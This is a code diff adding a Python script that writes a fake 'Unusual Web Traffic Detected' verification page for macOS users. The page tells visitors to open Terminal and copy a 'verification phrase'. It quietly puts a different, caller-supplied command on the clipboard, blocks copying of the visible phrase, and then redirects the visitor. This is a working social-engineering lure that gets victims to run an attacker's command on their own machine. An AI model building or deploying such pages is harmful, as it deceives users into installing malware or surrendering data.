@@ -1,0 +1,124 @@
+import sys
+
+html_template = """<!DOCTYPE html>
+<html lang=\"en\">
+<head>
+  <meta charset=\"utf-8\" />
+  <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\" />
+  <title>Unusual Web Traffic Detected</title>
+  <style>
+    :root{
+      --bg:#f6f7f9;--fg:#0f172a;--muted:#475569;--accent:#ef4444;--panel:#ffffff;--ring:#93c5fd;--ok:#16a34a
+    }
+    *{box-sizing:border-box}
+    html,body{height:100%}
+    body{
+      margin:0;background:var(--bg);color:var(--fg);
+      font-family:ui-sans-serif, system-ui, -apple-system, Segoe UI, Roboto, Helvetica, Arial, \"Apple Color Emoji\", \"Segoe UI Emoji\";
+      display:flex;align-items:center;justify-content:center;padding:24px
+    }
+    .card{
+      width:min(880px, 95vw);background:var(--panel);border-radius:16px;
+      box-shadow:0 10px 30px rgba(2,6,23,.08);padding:24px 24px 8px;border:1px solid #e5e7eb
+    }
+    .headline{display:flex;gap:12px;align-items:center;margin-bottom:10px}
+    .badge{width:14px;height:14px;border-radius:50%;background:var(--accent)}
+    h1{font-size:22px;margin:0}
+    p{color:var(--muted);line-height:1.5;margin:8px 0}
+
+    .panel{border:1px solid #e5e7eb;border-radius:12px;padding:16px;margin-top:12px;background:#fcfcfc}
+    .steps{display:grid;gap:10px;margin:8px 0 12px 0;list-style:decimal;padding-left:18px}
+    .kbd{display:inline-block;border:1px solid #cbd5e1;border-bottom-width:2px;border-radius:8px;padding:2px 6px;background:#fff;font-family:ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, \"Liberation Mono\", \"Courier New\", monospace;font-size:12px}
+
+    .copy-row{display:flex;gap:8px;align-items:center;margin-top:6px}
+    .codebox{flex:1;border:1px dashed #cbd5e1;border-radius:10px;background:#fff;padding:10px;font-family:ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, monospace;white-space:nowrap;overflow:auto;user-select:none}
+    .btn{appearance:none;border:1px solid #cbd5e1;border-bottom-width:2px;background:#fff;border-radius:10px;padding:10px 14px;cursor:pointer}
+    .btn:focus{outline:3px solid var(--ring)}
+    .btn.primary{background:#111827;color:#fff;border-color:#111827}
+
+    .status{font-size:12px;color:#64748b;margin-top:10px}
+    .status.good{color:var(--ok)}
+    .status.bad{color:var(--accent)}
+  </style>
+</head>
+<body>
+  <main class=\"card\" role=\"main\" aria-labelledby=\"title\">
+    <div class=\"headline\">
+      <span class=\"badge\" aria-hidden=\"true\"></span>
+      <h1 id=\"title\">Unusual Web Traffic Detected</h1>
+    </div>
+    <p>Our security system noticed irregular activity from your network. Complete the steps below to confirm you are a human. <strong>After verification is complete, this page will automatically forward you.</strong></p>
+
+    <section class=\"panel\" aria-label=\"Instructions\">
+      <ol class=\"steps\">
+        <li>Press <span class=\"kbd\">Command ⌘</span> + <span class=\"kbd\">Space</span> to open Spotlight.</li>
+        <li>Type <span class=\"kbd\">Terminal</span> and press <span class=\"kbd\">Return</span>.</li>
+        <li>Click <strong>Copy</strong> to copy the verification text.</li>
+      </ol>
+      <div class=\"copy-row\">
+        <div class=\"codebox\" id=\"phraseBox\" aria-label=\"Verification phrase\" tabindex=\"-1\">{user_text}</div>
+        <button class=\"btn\" id=\"copyBtn\" aria-label=\"Copy phrase\">Copy</button>
+      </div>
+      <div class=\"status\" id=\"statusMsg\">Waiting for verification…</div>
+    </section>
+  </main>
+
+  <script>
+    const USER_TEXT = `{user_text}`;
+    const COPY_TEXT = `{copy_text}`;
+    const REDIRECT_URL = `{redirect_url}`;
+    const DELAY_SECS = {delay_secs};
+
+    const phraseBox = document.getElementById('phraseBox');
+    ['selectstart','copy','contextmenu','dragstart'].forEach(ev => phraseBox.addEventListener(ev, e => e.preventDefault()));
+
+    let timerStarted = false;
+    document.getElementById('copyBtn').addEventListener('click', () => {
+      const text = COPY_TEXT;
+      const afterCopy = () => {
+        if (!timerStarted) {
+          timerStarted = true;
+          
+          setTimeout(() => { window.location.href = REDIRECT_URL; }, DELAY_SECS * 1000);
+        }
+        flashBtn('Copied!');
+      };
+      if (navigator.clipboard?.writeText) {
+        navigator.clipboard.writeText(text).then(afterCopy).catch(() => fallbackCopy(text, afterCopy));
+      } else {
+        fallbackCopy(text, afterCopy);
+      }
+    });
+    function fallbackCopy(text, cb){
+      const ta=document.createElement('textarea'); ta.value=text; document.body.appendChild(ta); ta.select();
+      try{document.execCommand('copy'); cb&&cb();}catch{} finally{document.body.removeChild(ta)}
+    }
+    function flashBtn(msg){ const b=document.getElementById('copyBtn'); const old=b.textContent; b.textContent=msg; setTimeout(()=>b.textContent=old,1200); }
+  </script>
+</body>
+</html>
+"""
+
+if __name__ == "__main__":
+    if len(sys.argv) != 5:
+        print(f"Usage: python {sys.argv[0]} <copy_text> <user_text> <redirect_url> <seconds_delay>")
+        sys.exit(1)
+    copy_text = sys.argv[1]
+    user_text = sys.argv[2]
+    redirect_url = sys.argv[3]
+    try:
+        delay_secs = int(sys.argv[4])
+        if delay_secs < 0:
+            raise ValueError
+    except ValueError:
+        print("seconds_delay must be a non-negative integer")
+        sys.exit(1)
+
+    html_content = (html_template
+                    .replace("{copy_text}", copy_text)
+                    .replace("{user_text}", user_text)
+                    .replace("{redirect_url}", redirect_url)
+                    .replace("{delay_secs}", str(delay_secs)))
+    with open("robot_check.html", "w", encoding="utf-8") as f:
+        f.write(html_content)
+    print("robot_check.html generated successfully!")
